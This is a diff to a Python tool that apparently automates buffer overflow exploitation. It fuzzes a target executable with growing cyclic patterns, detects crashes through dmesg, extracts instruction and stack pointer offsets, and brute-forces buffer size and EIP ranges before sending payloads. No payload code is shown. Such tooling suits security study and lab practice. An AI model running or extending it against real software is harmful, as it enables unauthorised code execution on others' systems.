@@ -153,23 +153,26 @@ class exploit:
                 # Linux process is easy, Windows not as much
                 if self.local_os == "linux":
                     print("\n[*] Getting buffer size...")
+                    successful_pattern = None
                     for size in range(100, 5000, 50):
                         if size % 100 == 0:
                             print(f"\t[*] Trying with pattern of size {size}")
                         pattern = gen_pattern(size)
+                        init_dmesg = check_dmesg()
                         p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                               stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
-                        output = p1.communicate(input=pattern)[0]
-                        if "segmentation" in output.lower():
+                        p1.communicate(input=pattern)
+                        new_dmesg = check_dmesg()
+                        if new_dmesg[-1] != init_dmesg[-1]:
                             print(
                                 "\t[*] Successfully triggered overflow. Calculating offset...")
-                            successful_pattern = gen_pattern(size)
+                            successful_pattern = pattern
                             break
-                    if not successful_pattern:
+                    if successful_pattern == None:
                         print("\n#|| Unable to trigger overflow. Please calculate the offset " +
                               "manually and return")
                         return
-                    check_dmesg(self, successful_pattern)
+                    interpret_dmesg(self, new_dmesg, successful_pattern)
                 else:
                     # if local os is windows:
                     ud()
@@ -438,6 +441,7 @@ class exploit:
                         cmd_string = "sudo " + cmd_string
                 else:
                     print(missing)
+                    input("Press ENTER to Return")
                     return
             elif self.local_os == "windows":
                 # Local Windows
@@ -451,24 +455,26 @@ class exploit:
                 pass
             else:
                 print(missing)
+                input("Press ENTER to Return")
                 return
         else:
             # .is_local failed to be defined
             print(missing)
+            input("Press ENTER to Return")
             return
 
         buffer_interval = int(get_input("\nEnter a confidence interval for your buffer size: " +
                                         "([1]-1000)\n" +
                                         "For interval = n, I will conduct an attempt for every buffer size in range " +
                                         "(nominal - n, nominal + n)\n",
-                                        [str(i) for i in range(1, 1001)], default="1"))
+                                        [str(i) for i in range(1001)], default="0"))
 
         eip_interval = int(get_input("\nEnter a confidence interval for your target EIP: " +
                                      "([1]-1000)\n" +
                                      "For interval = n, I will conduct an attempt for every EIP in range " +
                                      "(nominal - (1 byte)*n, nominal + (1 byte)*n)\n" +
                                      "For interval = n, I will conduct 2*(n+1) attempts\n",
-                                     [str(i) for i in range(1, 1001)], default="1"))
+                                     [str(i) for i in range(1001)], default="0"))
 
         print("\n[*] Sending payload(s)!")
 
@@ -520,7 +526,7 @@ class exploit:
 ########################################################################################################
 
 
-def check_dmesg(exp, successful_pattern):
+def check_dmesg():
     """
     Get dmesg output on linux
     """
@@ -531,13 +537,24 @@ def check_dmesg(exp, successful_pattern):
         dmesg = subprocess.check_output("sudo dmesg | tail", stderr=subprocess.STDOUT,
                                         shell=True, universal_newlines=True).split("\n")
     # print(dmesg)    # Debug
+    # Remove any lines without at least three consecutive non-whitespace characters
+    for line in dmesg:
+        if not re.search(r"\S{3,}", line):
+            dmesg.remove(line)
+    return dmesg
+
+
+def interpret_dmesg(exp, dmesg, successful_pattern):
+    """
+    Get useful information from dmesg output
+    """
     err = ""
     for i in range(1, 1+len(dmesg)):
         if "ip" in dmesg[-i] and "sp" in dmesg[-i]:
             err = dmesg[-i]
             print("\n"+err+"\n")
             break
-    # print(last_line)    # Debug
+   # print(last_line)    # Debug
     ip, sp = None, None
     if "ip" in err and "sp" in err:
         err = err.split()
@@ -664,6 +681,7 @@ def exploit_handler(exp):
             break
         else:
             input("Invalid option")
+        choice = None
 
 
 def main_menu(choice=None, filename=None):
@@ -703,6 +721,8 @@ def main_menu(choice=None, filename=None):
         elif choice == 4:
             print("#|| Goodbye!")
             break
+        choice = None
+        filename = None
         clear_screen()
 
 
